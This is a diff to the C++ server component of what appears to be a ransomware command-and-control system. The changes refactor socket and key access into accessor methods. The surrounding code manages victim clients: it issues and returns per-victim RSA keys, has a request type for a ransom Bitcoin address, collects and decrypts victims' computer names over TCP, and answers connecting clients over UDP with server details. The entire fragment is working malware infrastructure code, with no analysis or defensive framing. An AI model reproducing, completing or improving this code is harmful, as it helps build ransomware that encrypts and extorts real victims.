@@ -112,13 +112,13 @@ BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 
 		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
 		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
-		responseCommand.privateEncryptionKey = client->Secrets.strPrivateKey;
+		responseCommand.privateEncryptionKey = client->GetSecrets().strPrivateKey;
 		success = TCPSendMessageToClient(cuid, responseCommand);
 		std::cout << "sending\n";
 
 		break;
 	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
-		SendTCPClientRSAPublicKey(cuid, client->Secrets.bioPublicKey);
+		SendTCPClientRSAPublicKey(cuid, client->GetSecrets().bioPublicKey);
 		break;
 	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
 		break;
@@ -138,14 +138,14 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
 	// initial request to send rsa keys
 	{
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
 		PerformTCPRequest(receivedData, cuid);
 	}
 
 	// tcp receive main loop
 	do 
 	{
-		BIO* pk = NetCommon::GetBIOFromString(client->Secrets.strPrivateKey);
+		BIO* pk = NetCommon::GetBIOFromString(client->GetSecrets().strPrivateKey);
 	
 		if ( client->ComputerName == "unknown" )
 			GetClientComputerName(cuid);
@@ -159,7 +159,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		}
 		
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket, TRUE, pk);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, pk);
 		receiving = receivedData.valid;
 
 		std::cout << "Client name: " << client->ComputerName << std::endl;
@@ -179,7 +179,7 @@ BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
 	std::string base64 = macaron::Base64::Encode(bio);  
 	BYTESTRING buffer = Serialization::SerializeString(base64);
 
-	BOOL sent = NetCommon::TransmitData(buffer, client->TCPSocket, TCP);
+	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
 	std::cout << "Sent RSA Pub Key " << bio << std::endl;
 
 	return TRUE;
@@ -218,11 +218,11 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 	Client* client = GetClientPtr(cuid);
 
 	BYTESTRING computerNameSerialized;
-	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->TCPSocket, TCP);
+	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->GetSocket(TCP), TCP);
 	if ( !received )
 		return FALSE;
 
-	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->Secrets.bioPrivateKey, TRUE);
+	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
 	client->ComputerName = computerName.c_str();
 	std::cout << "Got client computer naem: " << client->ComputerName << " / " << computerName << std::endl;
@@ -304,7 +304,7 @@ BOOL ServerInterface::StartServer(Server& server) {
 
 BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
 	Client* c = GetClientPtr(cuid);
-	return NetCommon::TransmitData(req, c->TCPSocket, TCP);
+	return NetCommon::TransmitData(req, c->GetSocket(TCP), TCP);
 }
 
 ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
@@ -326,7 +326,7 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
 
 BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
 	message.isValid = TRUE;
-	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.AddressInfo);
+	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
 }
 
 BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr) {
@@ -343,7 +343,7 @@ BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingA
 	case ClientMessage::CONNECT_CLIENT:	
 		Client client(req.tcp, req.udp, incomingAddr);
 
-		std::cout << "Client UDP socket: " << client.UDPSocket << std::endl;
+		std::cout << "Client UDP socket: " << client.GetSocket(UDP) << std::endl;
 
 		// client wants to connect so respond with tcp server details
 		hostent* host = GetHostByName(DNS_NAME.c_str());
@@ -378,7 +378,7 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 		return {};
 
 	Client* client = GetClientPtr(cuid);
-	if ( client->TCPSocket == INVALID_SOCKET ) // socket isnt ready so cant ping.
+	if ( client->GetSocket(TCP) == INVALID_SOCKET ) // socket isnt ready so cant ping.
 		return {};
 
 	// send the ping to the client over tcp
